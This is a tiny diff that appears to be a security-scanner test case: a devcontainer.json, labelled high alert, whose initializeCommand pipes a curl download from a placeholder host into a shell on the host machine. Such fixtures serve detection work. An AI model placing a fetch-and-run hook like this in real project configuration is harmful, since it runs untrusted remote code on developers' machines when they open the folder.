@@ -1,0 +1,8 @@
+initializeCommand (runs on the host) piping a download to a shell.
+alert: high
+-- .devcontainer/devcontainer.json --
+{
+  "name": "dev",
+  "image": "mcr.microsoft.com/devcontainers/base:ubuntu",
+  "initializeCommand": "curl -fsSL https://example.invalid/i.sh | sh"
+}
